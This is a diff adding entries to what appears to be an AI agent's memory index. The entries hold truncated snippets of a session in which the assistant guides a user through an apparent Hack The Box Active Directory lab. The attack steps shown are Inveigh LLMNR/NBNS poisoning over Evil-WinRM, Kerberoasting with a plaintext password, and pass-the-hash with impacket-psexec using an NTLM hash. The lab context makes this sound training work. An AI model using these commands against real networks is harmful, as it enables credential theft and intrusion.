+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "memory/2026-05-02.md",
+        "memories",
+        "flushed",
+        "ready",
+        "continue",
+        "ct059",
+        "hunt",
+        "whenever"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:15:15": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:15:15",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 15,
+      "endLine": 15,
+      "source": "memory",
+      "snippet": "User: There was syntax error *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Start-Job -Name InveighCapture -ScriptBlock { At line:1 char:45 + Start-Job -Name InveighCapture -ScriptBlock { + ~ Missing closing '}' in statement block or type definition. + CategoryInfo : ParserErr",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "start-job",
+        "was",
+        "syntax",
+        "error",
+        "evil",
+        "winrm",
+        "users"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:16:16": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:16:16",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 16,
+      "endLine": 16,
+      "source": "memory",
+      "snippet": "User: CategoryInfo : ResourceUnavailable: (C:\\Windows\\Temp\\Inveigh.ps1:String) [Import-Module], FileNotFoundException + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> *Evil-WinRM*",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "inveigh.ps1",
+        "import-module",
+        "modules-modulenotfound",
+        "evil-winrm",
+        "categoryinfo",
+        "resourceunavailable",
+        "windows",
+        "temp"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:17:17": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:17:17",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 17,
+      "endLine": 17,
+      "source": "memory",
+      "snippet": "User: (Invoke-Inveigh:String) [], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> }",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "invoke-inveigh",
+        "evil-winrm",
+        "invoke",
+        "inveigh:string",
+        "commandnotfoundexception",
+        "fullyqualifiederrorid",
+        "evil",
+        "winrm"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:18:18": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:18:18",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 18,
+      "endLine": 18,
+      "source": "memory",
+      "snippet": "Assistant: Two problems: **Inveigh.ps1 isn't on MS01**, and the multi-line syntax broke in evil-winRM. **Step 1 — Upload Inveigh.ps1:** ```powershell upload /home/openclaw/.openclaw/htb_tools/Inveigh.ps1 C:\\Windows\\Temp\\Inveigh.ps1 ``` Or download it directly on MS01: ```powershe",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "inveigh.ps1",
+        "multi-line",
+        "evil-winrm",
+        "home/openclaw",
+        "openclaw/htb-tools/inveigh.ps1",
+        "two",
+        "problems",
+        "isn't"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:19:19": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:19:19",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 19,
+      "endLine": 19,
+      "source": "memory",
+      "snippet": "Assistant: Select-Object Name, StartName Restart-Service -Name \"<ServiceName>\" ``` **Also try this parallel approach — Kerberoast CT059:** ```bash # On Parrot impacket-GetUserSPNs INLANEFREIGHT.LOCAL/BR086:Welcome1 -dc-ip 172.16.7.3 -request-user CT059 ``` Upload Inveigh first, t",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "select-object",
+        "restart-service",
+        "impacket-getuserspns",
+        "inlanefreight.local/br086",
+        "dc-ip",
+        "172.16.7.3",
+        "request-user",
+        "select"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:20:20": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:20:20",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 20,
+      "endLine": 20,
+      "source": "memory",
+      "snippet": "User: I've uploaded Inveigh. I tired this command from earlier. *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Invoke-Inveigh -RunTime 10 -ConsoleOutput Y -FileOutput Y -OutputDir C:\\Windows\\Temp -NBNS Y -mDNS Y -LLMNR Y [-] -OutputDir C:\\Windows\\Temp is not a valid parameter",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "invoke-inveigh",
+        "i've",
+        "uploaded",
+        "inveigh",
+        "tired",
+        "command",
+        "earlier"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:21:21": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:21:21",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 21,
+      "endLine": 21,
+      "source": "memory",
+      "snippet": "Assistant: Drop `-OutputDir` and simplify: ```powershell Invoke-Inveigh -RunTime 10 -ConsoleOutput Y -FileOutput Y -NBNS Y -LLMNR Y ``` That should start cleanly. While it runs, **check for CT059 services** in another evil-winRM tab: ```powershell Get-WmiObject Win32_Service | Wh",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "invoke-inveigh",
+        "evil-winrm",
+        "get-wmiobject",
+        "win32-service",
+        "drop",
+        "outputdir",
+        "simplify",
+        "powershell"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:22:22": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:22:22",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 22,
+      "endLine": 22,
+      "source": "memory",
+      "snippet": "User: It didn't [+] NBNS TTL = 165 Seconds [+] SMB Capture = Enabled [+] HTTP Capture = Enabled [+] HTTPS Capture = Disabled [+] HTTP/HTTPS Authentication = NTLM [+] WPAD Authentication = NTLM [+] WPAD NTLM Authentication Ignore List = Firefox [+] WPAD Response = Enabled [+] Kerb",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "http/https",
+        "didn't",
+        "nbns",
+        "ttl",
+        "seconds",
+        "smb",
+        "capture",
+        "enabled"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:23:23": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:23:23",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 23,
+      "endLine": 23,
+      "source": "memory",
+      "snippet": "User: if([Console]::KeyAvailable) + ~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (:) [], InvalidOperationException + FullyQualifiedErrorId : System.InvalidOperationException *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> It seems really that getting an interactiv",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "system.invalidoperationexception",
+        "evil-winrm",
+        "console",
+        "keyavailable",
+        "categoryinfo",
+        "operationstopped",
+        "invalidoperationexception",
+        "fullyqualifiederrorid"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-05-02.txt:24:24": {
+      "key": "memory:memory/.dreams/session-corpus/2026-05-02.txt:24:24",
+      "path": "memory/.dreams/session-corpus/2026-05-02.txt",
+      "startLine": 24,
+      "endLine": 24,
+      "source": "memory",
+      "snippet": "Assistant: Right — evil-winRM's PTY is garbage for interactive tools. Let's get a proper shell. **Option 1: impacket-psexec (most reliable interactive shell):** ```bash impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99 Administrator@172.16.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-05-03T19:00:09.115Z",
+      "lastRecalledAt": "2026-05-03T19:00:09.115Z",
+      "queryHashes": [
+        "815cc1934125"
+      ],
+      "recallDays": [
+        "2026-05-04",
+        "2026-05-03"
+      ],
+      "conceptTags": [
+        "evil-winrm",
+        "impacket-psexec",
+        "172.16",
+        "right",
+        "evil",
+        "winrm's",
+        "pty",
+        "garbage"
       ]
     }
   }
